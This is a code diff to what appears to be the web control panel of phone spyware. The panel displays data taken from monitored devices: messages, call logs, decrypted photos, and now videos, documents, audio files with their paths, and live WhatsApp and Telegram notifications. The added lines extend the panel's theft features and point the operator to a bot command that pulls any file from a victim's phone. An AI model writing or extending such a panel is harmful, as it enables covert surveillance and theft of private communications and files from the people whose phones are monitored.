@@ -39,6 +39,7 @@ img.p{width:100%;border-radius:10px;margin:6px 0;border:1px solid var(--b)}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 a{color:var(--a);text-decoration:none}
 button.back{margin:10px 0;background:var(--c);color:var(--t);border:1px solid var(--b);border-radius:8px;padding:7px 14px;cursor:pointer}
+.path{font-family:monospace;font-size:11px;color:var(--m);word-break:break-all}
 #nf{display:none;padding:60px 20px;text-align:center}
 #nf .big{font-size:72px;font-weight:800;letter-spacing:-2px}
 </style></head><body>
@@ -112,6 +113,7 @@ try{if(sessionStorage.getItem('hubTry')&&parseInt(sessionStorage.getItem('hubTry
 function fmt(d){var x=new Date(d);return x.toLocaleDateString()+' '+x.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}
 function ago(t){var s=(Date.now()-t)/1000;if(s<0||isNaN(s))return'?';if(s<90)return Math.round(s)+'s ago';if(s<3600)return Math.round(s/60)+'m ago';if(s<86400)return Math.round(s/3600)+'h ago';return Math.round(s/86400)+'d ago'}
 function esc(s){var e=document.createElement('i');e.textContent=s==null?'':String(s);return e.innerHTML}
+function sz(b){if(b>1048576)return (b/1048576).toFixed(1)+' MB';if(b>1024)return Math.round(b/1024)+' KB';return b+' B'}
 async function tick(){
   if(!KEY)return;
   try{
@@ -148,17 +150,24 @@ function render(){
   var d=st[cur];
   document.getElementById('upd').textContent=d?('updated '+ago(d.time)):'';
   if(!d){m.innerHTML='<button class=back data-back=1>? All devices</button><div class=dim>Loading...</div>';return}
-  var nmsg=(d.msgs||[]).length,ncal=(d.calls||[]).length,nph=(d.photos||[]).length;
+  var fl=d.files||[];
+  var nph=(d.photos||[]).length, nimg=fl.filter(function(x){return x.k==='img'}).length;
+  var nvid=fl.filter(function(x){return x.k==='vid'}).length;
+  var ndoc=fl.filter(function(x){return x.k==='doc'||x.k==='aud'}).length;
+  var nnot=(d.notifs||[]).length;
   h+='<button class=back data-back=1>? All devices</button>';
-  h+='<div class=card><div class=nm style=font-weight:700;font-size:17px>'+(d.batt>=0&&d.batt<20?'?':'?')+' '+esc(d.name)+'</div>'
+  h+='<div class=card><div style=font-weight:700;font-size:17px>'+(d.batt>=0&&d.batt<20?'?':'?')+' '+esc(d.name)+'</div>'
     +'<div class=dim>? '+esc(d.sim||'')+' ? '+esc(d.model||'')+'</div>'
     +'<div>'+(d.batt>=0?battBar(d.batt)+' '+d.batt+'% '+(d.chg?'?':'')+' ? ':'')
     +'<span class=dim>check-in '+ago(d.time)+' ? '+esc(d.status||'')+'</span></div></div>';
   if(!sub){
     h+='<div class=tiles>'
-      +'<div class=tile data-sub=msgs><div class=e>?</div><div class=l>Messages</div><div class=n>'+nmsg+'</div></div>'
-      +'<div class=tile data-sub=calls><div class=e>?</div><div class=l>Calls</div><div class=n>'+ncal+'</div></div>'
-      +'<div class=tile data-sub=photos><div class=e>?</div><div class=l>Photos</div><div class=n>'+nph+'</div></div>'
+      +'<div class=tile data-sub=msgs><div class=e>?</div><div class=l>Messages</div><div class=n>'+(d.msgs||[]).length+'</div></div>'
+      +'<div class=tile data-sub=calls><div class=e>?</div><div class=l>Calls</div><div class=n>'+(d.calls||[]).length+'</div></div>'
+      +'<div class=tile data-sub=photos><div class=e>?</div><div class=l>Photos</div><div class=n>'+(nph+nimg)+'</div></div>'
+      +'<div class=tile data-sub=videos><div class=e>?</div><div class=l>Videos</div><div class=n>'+nvid+'</div></div>'
+      +'<div class=tile data-sub=files><div class=e>?</div><div class=l>Files</div><div class=n>'+ndoc+'</div></div>'
+      +'<div class=tile data-sub=notifs><div class=e>?</div><div class=l>App alerts</div><div class=n>'+nnot+'</div></div>'
       +'</div>';
   }else if(sub==='msgs'){
     var th2={},order=[];
@@ -185,7 +194,7 @@ function render(){
       });
     }
   }else if(sub==='calls'){
-    h+='<h4>? Calls ('+ncal+')</h4>';
+    h+='<h4>? Calls ('+(d.calls||[]).length+')</h4>';
     (d.calls||[]).forEach(function(k){
       var ic=k.t===3?'?':(k.t===2?'?':'?');
       var du=k.du>0?Math.floor(k.du/60)+':'+('0'+k.du%60).slice(-2):'';
@@ -193,12 +202,18 @@ function render(){
         +(du?' ? '+du:'')+'</span></div></div>';
     });
   }else if(sub==='photos'){
-    h+='<h4>? Photos ('+nph+')</h4><div class=grid>';
-    (d.photos||[]).forEach(function(p,i){
+    var gal=fl.filter(function(x){return x.k==='img'});
+    h+='<h4>? Uploaded ('+nph+')</h4><div class=grid>';
+    (d.photos||[]).forEach(function(p){
       h+='<div class=ph data-p='+esc(p.p)+'><div class=dim style=padding:30px 0;text-align:center>decrypting?</div></div>';
     });
     h+='</div>';
-    if(!nph)h+='<div class=dim>Photos from /cam and /photos appear here.</div>';
+    if(!nph)h+='<div class=dim>Camera photos appear here automatically.</div>';
+    h+='<h4>? On device ('+gal.length+')</h4>';
+    gal.slice(0,60).forEach(function(x){
+      h+='<div class=item><div>? <b>'+esc(x.n)+'</b><br><span class=path>'+esc(x.p)+'</span></div>'
+        +'<div style=text-align:right><span class=dim>'+ago(x.d)+' ? '+sz(x.s)+'</span></div></div>';
+    });
     setTimeout(function(){
       document.querySelectorAll('.ph').forEach(function(el){
         decBin(el.getAttribute('data-p')).then(function(u){
@@ -206,6 +221,30 @@ function render(){
         }).catch(function(){el.innerHTML='<div class=dim>?</div>'});
       });
     },50);
+  }else if(sub==='videos'){
+    var vid=fl.filter(function(x){return x.k==='vid'});
+    h+='<h4>? Videos ('+vid.length+')</h4>';
+    vid.slice(0,80).forEach(function(x){
+      h+='<div class=item><div>? <b>'+esc(x.n)+'</b><br><span class=path>'+esc(x.p)+'</span></div>'
+        +'<div style=text-align:right><span class=dim>'+ago(x.d)+' ? '+sz(x.s)+'</span></div></div>';
+    });
+    h+='<div class=dim>Pull any video with the bot: /vid 1 ? or /get &lt;path&gt;</div>';
+  }else if(sub==='files'){
+    var docs=fl.filter(function(x){return x.k==='doc'||x.k==='aud'});
+    h+='<h4>? Files ('+docs.length+')</h4>';
+    docs.slice(0,100).forEach(function(x){
+      var ic=x.k==='aud'?'?':'?';
+      h+='<div class=item><div>'+ic+' <b>'+esc(x.n)+'</b><br><span class=path>'+esc(x.p)+'</span></div>'
+        +'<div style=text-align:right><span class=dim>'+ago(x.d)+' ? '+sz(x.s)+'</span></div></div>';
+    });
+    h+='<div class=dim>Pull any file with the bot: /get &lt;path&gt;</div>';
+  }else if(sub==='notifs'){
+    h+='<h4>? App alerts ('+nnot+')</h4>';
+    (d.notifs||[]).slice(0,150).forEach(function(x){
+      h+='<div class=item><div>? <b>'+esc(x.a)+'</b><br><span class=dim>'+esc(x.t)+'</span></div>'
+        +'<div style=text-align:right><span class=dim>'+ago(x.d)+'</span></div></div>';
+    });
+    if(!nnot)h+='<div class=dim>Message alerts from WhatsApp / Telegram / any app appear here the moment they arrive.</div>';
   }
   m.innerHTML=h;
 }
